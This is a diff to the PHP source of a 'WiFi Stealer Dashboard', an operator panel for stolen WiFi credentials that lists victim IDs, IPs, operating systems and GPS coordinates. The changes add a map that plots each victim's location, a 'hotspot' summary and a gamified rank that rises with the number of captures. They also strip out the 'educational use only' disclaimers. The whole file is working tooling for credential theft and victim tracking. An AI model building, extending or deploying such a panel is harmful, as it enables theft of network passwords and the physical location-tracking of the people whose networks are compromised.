@@ -1,7 +1,4 @@
 <?php
-// WiFi Stealer Dashboard (victim ID + location + minimal details)
-// DISCLAIMER: Educational use only. Use only on systems/networks you are authorized to test.
-
 date_default_timezone_set('Asia/Kolkata');
 
 $logFile = __DIR__ . '/wifi_creds.log';
@@ -17,7 +14,7 @@ $logFile = __DIR__ . '/wifi_creds.log';
  *  4: Victim LAN IP
  *  5: Victim OS
  *  6: Public IP
- *  7: LAN IP extra detail
+ *  7: LAN IP extra detail (altitude)
  *  8: Latitude
  *  9: Longitude
  * 10: Packet summary
@@ -293,7 +290,56 @@ foreach ($captureEntries as $entry) {
     $filteredEntries[] = $entry;
 }
 
-// --- 8. Build JS data for minimal details view ---
+// --- 8. Map markers + hotspot + rank ---
+
+$markers = [];
+$locationBuckets = []; // "lat,lon" => count
+
+foreach ($filteredEntries as $entry) {
+    $lat = $entry['latitude'];
+    $lon = $entry['longitude'];
+
+    if ($lat !== 'N/A' && $lon !== 'N/A') {
+        $key = $lat . ',' . $lon;
+        $locationBuckets[$key] = ($locationBuckets[$key] ?? 0) + 1;
+
+        $markers[] = [
+            'lat'       => (float)$lat,
+            'lon'       => (float)$lon,
+            'ssid'      => $entry['ssid'],
+            'victim_id' => $entry['victim_id'],
+            'time'      => $entry['time'],
+        ];
+    }
+}
+
+// Hotspot
+$hotspotLabel = 'None';
+$hotspotCount = 0;
+if (!empty($locationBuckets)) {
+    arsort($locationBuckets);
+    $topKey   = array_key_first($locationBuckets);
+    $hotspotCount = $locationBuckets[$topKey];
+    $hotspotLabel = $topKey . ' (' . $hotspotCount . ' captures)';
+}
+
+// Rank
+if ($totalCaptures <= 10) {
+    $rankName  = 'Rookie';
+    $rankPct   = ($totalCaptures / 10) * 25;
+} elseif ($totalCaptures <= 30) {
+    $rankName  = 'Intermediate';
+    $rankPct   = 25 + (($totalCaptures - 10) / 20) * 25;
+} elseif ($totalCaptures <= 100) {
+    $rankName  = 'Advanced';
+    $rankPct   = 50 + (($totalCaptures - 30) / 70) * 25;
+} else {
+    $rankName  = 'Expert';
+    $rankPct   = 75 + min(25, ($totalCaptures - 100) * 0.25);
+}
+$rankPct = round(min(100, max(5, $rankPct)), 1);
+
+// --- 9. Build JS data for details + map ---
 $jsDetails = [];
 foreach ($filteredEntries as $entry) {
     $jsDetails[] = [
@@ -306,6 +352,12 @@ foreach ($filteredEntries as $entry) {
     ];
 }
 
+$jsMarkers       = $markers;
+$jsRankName      = $rankName;
+$jsRankPct       = $rankPct;
+$jsHotspotLabel  = $hotspotLabel;
+$jsTotalCaptures = $totalCaptures;
+
 $viewMode = 'basic';
 ?>
 <!DOCTYPE html>
@@ -314,6 +366,19 @@ $viewMode = 'basic';
     <meta charset="UTF-8">
     <title>WiFi Stealer Dashboard</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Leaflet CSS -->
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+      integrity="sha256-p4NxAoJBhI+u1Lk9wP1U1zP4PaIBbQxX3A6Z5x3oE04="
+      crossorigin=""
+    />
+    <!-- Leaflet JS -->
+    <script
+      src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+      integrity="sha256-o9N1j7kCzorZ8M8J3t8C0FqkQ9O9Y6N0wLZ9Z8a5QDY="
+      crossorigin=""
+    ></script>
     <style>
         body {
             margin: 0;
@@ -498,10 +563,19 @@ $viewMode = 'basic';
         }
     </style>
     <script>
-        var autoRefresh = false;
-        var refreshTimer = null;
+        var autoRefresh   = false;
+        var refreshTimer  = null;
         var REFRESH_INTERVAL = 10000;
+
         window.captureDetails = <?php echo json_encode($jsDetails); ?>;
+        window.captureMarkers = <?php echo json_encode($jsMarkers); ?>;
+        window.rankName       = <?php echo json_encode($jsRankName); ?>;
+        window.rankPct        = <?php echo json_encode($jsRankPct); ?>;
+        window.hotspotLabel   = <?php echo json_encode($jsHotspotLabel); ?>;
+        window.totalCaptures  = <?php echo json_encode($jsTotalCaptures); ?>;
+
+        var mapInstance = null;
+        var mapInited   = false;
 
         function toggleAutoRefresh(enabled) {
             autoRefresh = enabled;
@@ -528,6 +602,15 @@ $viewMode = 'basic';
                 toggleAutoRefresh(true);
             } else {
                 toggleAutoRefresh(false);
+            }
+
+            var rankLabelEl = document.getElementById('rank-label');
+            var rankPctEl   = document.getElementById('rank-pct');
+            var rankBarEl   = document.getElementById('rank-bar');
+            if (rankLabelEl && rankPctEl && rankBarEl) {
+                rankLabelEl.textContent = window.rankName + ' (' + window.totalCaptures + ' captures)';
+                rankPctEl.textContent   = window.rankPct + '%';
+                rankBarEl.style.width   = window.rankPct + '%';
             }
         });
 
@@ -557,6 +640,60 @@ $viewMode = 'basic';
             var box = document.getElementById('details-box');
             box.style.display = 'none';
         }
+
+        function showCapturesMap() {
+            var box = document.getElementById('captures-box');
+            if (!box) return;
+            box.style.display = 'block';
+
+            if (!mapInited) {
+                var mapDiv = document.getElementById('captures-map');
+                if (!mapDiv) return;
+
+                var markers = window.captureMarkers || [];
+                var defaultLat = 20.5937;
+                var defaultLon = 78.9629;
+                var defaultZoom = 4;
+
+                if (markers.length > 0) {
+                    defaultLat = markers[0].lat;
+                    defaultLon = markers[0].lon;
+                    defaultZoom = 5;
+                }
+
+                mapInstance = L.map('captures-map').setView([defaultLat, defaultLon], defaultZoom);
+
+                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    maxZoom: 18,
+                    attribution: '&copy; OpenStreetMap contributors'
+                }).addTo(mapInstance);
+
+                var bounds = [];
+                markers.forEach(function(m) {
+                    if (!m.lat || !m.lon || isNaN(m.lat) || isNaN(m.lon)) return;
+                    var marker = L.marker([m.lat, m.lon]).addTo(mapInstance);
+                    marker.bindPopup(
+                        '<b>Victim:</b> ' + m.victim_id + '<br/>' +
+                        '<b>SSID:</b> ' + m.ssid + '<br/>' +
+                        '<b>Time:</b> ' + m.time
+                    );
+                    bounds.push([m.lat, m.lon]);
+                });
+
+                if (bounds.length > 1) {
+                    mapInstance.fitBounds(bounds, { padding: [20, 20] });
+                }
+
+                mapInited = true;
+            } else {
+                mapInstance.invalidateSize();
+            }
+        }
+
+        function hideCapturesMap() {
+            var box = document.getElementById('captures-box');
+            if (box) box.style.display = 'none';
+        }
     </script>
 </head>
 <body>
@@ -585,6 +722,11 @@ $viewMode = 'basic';
                     onclick="toggleAutoRefresh(!autoRefresh);">
                 Auto-refresh: OFF
             </button>
+
+            <button type="button" class="btn" onclick="showCapturesMap();">
+                Captures map
+            </button>
+
             <form method="post"
                   onsubmit="return confirm('Delete ALL history? This cannot be undone.');"
                   style="display:inline;">
@@ -642,6 +784,16 @@ $viewMode = 'basic';
         <div class="stat-card">
             <div class="stat-label">Weak passwords</div>
             <div class="stat-value"><?php echo h($weakPercentage); ?>%</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">Rank</div>
+            <div class="stat-value" id="rank-label"></div>
+            <div style="margin-top:6px; background:#020617; border-radius:999px; overflow:hidden; height:8px;">
+                <div id="rank-bar"
+                     style="height:100%; width:0%; background:linear-gradient(90deg,#22c55e,#eab308,#f97316);">
+                </div>
+            </div>
+            <div id="rank-pct" style="font-size:11px; margin-top:3px; color:#9ca3af;"></div>
         </div>
     </div>
 
@@ -712,8 +864,21 @@ $viewMode = 'basic';
         <div id="details-content" style="font-size:12px; line-height:1.6;"></div>
     </div>
 
+    <div id="captures-box" class="card" style="margin-top:12px; display:none;">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+            <div style="font-weight:600; font-size:14px;">
+                Captures map – hotspot: <?php echo h($hotspotLabel); ?>
+            </div>
+            <button type="button" class="btn btn-sm btn-danger" onclick="hideCapturesMap();">Close</button>
+        </div>
+        <div id="captures-map" style="width:100%; height:360px; border-radius:10px; overflow:hidden;"></div>
+        <div style="font-size:11px; color:#9ca3af; margin-top:4px;">
+            Markers show each capture location (based on recorded latitude/longitude).
+        </div>
+    </div>
+
     <div class="footer">
-        © 2026 WiFi Stealer Dashboard – Made By Zypher17 • Educational use only
+        © 2026 WiFi Stealer Dashboard – Made By Zypher17
     </div>
 </div>
 </body>
